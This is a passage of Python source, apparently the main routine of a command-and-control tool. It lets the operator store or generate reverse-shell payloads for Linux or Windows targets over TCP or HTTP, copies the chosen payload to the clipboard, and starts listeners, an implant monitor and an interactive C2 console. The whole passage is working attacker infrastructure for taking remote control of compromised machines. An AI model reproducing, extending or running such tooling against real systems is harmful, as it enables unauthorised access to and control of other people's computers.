        OS_CHOICE = os_choice
        try:
            threading.Thread(target=run_http_server, daemon=True).start()
            threading.Thread(target=monitor_http_implants, daemon=True).start()
            threading.Thread(target=run_raw_tcp_server, daemon=True).start()
            time.sleep(0.5)
            print(f"\n[*] Listeners started on {HOST} (HTTP: {HTTP_PORT}, TCP: {RAW_TCP_PORT}).")
            c2_console()
        except Exception as e:
            print(f"[!] Failed to start listeners: {e}")
            sys.exit(1)
        return

    # ------------------
    # Interactive mode (mirrors CLI)
    # ------------------

    mode_choice = ask_choice("Mode (Use/Store): ", ["Use", "Store"])

    if mode_choice == "Store":
        os_choice = ask_choice("Target OS (Linux/Windows): ", ["Linux", "Windows"])
        connection = ask_choice("Connection type (tcp/http): ", ["tcp", "http"])
        lhost = ask_ip("Enter LHOST (IPv4): ")
        lport = ask_port("Enter LPORT (1-65535): ")
        name = ""
        while not name:
            name = input("Enter payload name: ").strip()
            if not name:
                print("[!] Name cannot be empty.")
        pay_content = ""
        while not pay_content:
            pay_content = input("Enter payload content (use your real host:port; they will be templated): ").strip()
            if not pay_content:
                print("[!] Payload content cannot be empty.")
        templated = template_payload_content(pay_content, lhost, lport)
        save_custom_payload(os_choice, name, templated, connection)
        print(f"[+] Stored payload '{name}' for {os_choice} ({connection}).")
        sys.exit(0)

    # Use/generate and listen
    os_choice = ask_choice("Target OS (Linux/Windows): ", ["Linux", "Windows"])
    connection = ask_choice("Connection type (tcp/http): ", ["tcp", "http"])
    lhost = ask_ip("Enter LHOST (IPv4): ")

    DEFAULT_HTTP = 2222
    DEFAULT_TCP = 4444
    http_port = None
    tcp_port = None
    if connection == "tcp":
        # Ask TCP; default HTTP
        while True:
            tcp_port = ask_port("Enter TCP (raw reverse shell) listener port (1-65535): ")
            if not can_bind(lhost, tcp_port):
                print(f"[!] Cannot bind to {lhost}:{tcp_port}. Try a different port or ensure the host interface exists.")
                continue
            break
        http_port = find_available_port(lhost, DEFAULT_HTTP) or DEFAULT_HTTP
        if not can_bind(lhost, http_port):
            print(f"[!] Default HTTP {DEFAULT_HTTP} unavailable on {lhost}.")
            while True:
                http_port = ask_port("Enter HTTP listener port (1-65535): ")
                if not can_bind(lhost, http_port):
                    print(f"[!] Cannot bind to {lhost}:{http_port}. Try a different port or ensure the host interface exists.")
                    continue
                break
    else:
        # Ask HTTP; default TCP
        while True:
            http_port = ask_port("Enter HTTP listener port (1-65535): ")
            if not can_bind(lhost, http_port):
                print(f"[!] Cannot bind to {lhost}:{http_port}. Try a different port or ensure the host interface exists.")
                continue
            break
        tcp_port = find_available_port(lhost, DEFAULT_TCP) or DEFAULT_TCP
        if not can_bind(lhost, tcp_port):
            print(f"[!] Default TCP {DEFAULT_TCP} unavailable on {lhost}.")
            while True:
                tcp_port = ask_port("Enter TCP (raw reverse shell) listener port (1-65535): ")
                if not can_bind(lhost, tcp_port):
                    print(f"[!] Cannot bind to {lhost}:{tcp_port}. Try a different port or ensure the host interface exists.")
                    continue
                break

    module = load_payload_module(os_choice)
    customs = load_custom_payloads(os_choice)
    keys = list_keys_filtered_by_connection(getattr(module, "payloads", {}), customs, connection)
    if not keys:
        print(f"[!] No payloads available for {os_choice} ({connection}). Add some with -m=c or 'Store' mode.")
        sys.exit(2)

    print("\nAvailable payloads (filtered):")
    for k in keys:
        print(" -", k)

    payload_key = ask_choice("Select payload (type exact key): ", keys)

    combined = merge_builtins_and_customs(getattr(module, "payloads", {}), customs)
    ModuleProxy = type("ModuleProxy", (), {})
    module_proxy = ModuleProxy()
    module_proxy.payloads = combined

    selected_port = tcp_port if connection == "tcp" else http_port
    payload_text = generate_payload_text(module_proxy, payload_key, lhost, selected_port)

    print("\n[+] Generated payload (copied to clipboard):\n")
    print(Fore.RED + payload_text + Style.RESET_ALL)
    try:
        pyperclip.copy(payload_text)
        print("[+] Payload copied to clipboard.")
    except Exception as e:
        print(f"[!] Could not copy to clipboard: {e}")

    HOST = lhost
    HTTP_PORT = http_port
    RAW_TCP_PORT = tcp_port
    OS_CHOICE = os_choice

    try:
        threading.Thread(target=run_http_server, daemon=True).start()
        threading.Thread(target=monitor_http_implants, daemon=True).start()
        threading.Thread(target=run_raw_tcp_server, daemon=True).start()
        time.sleep(0.5)
        print(f"\n[*] Listeners started on {HOST} (HTTP: {HTTP_PORT}, TCP: {RAW_TCP_PORT}).")
        c2_console()
    except Exception as e:
        print(f"[!] Failed to start listeners: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()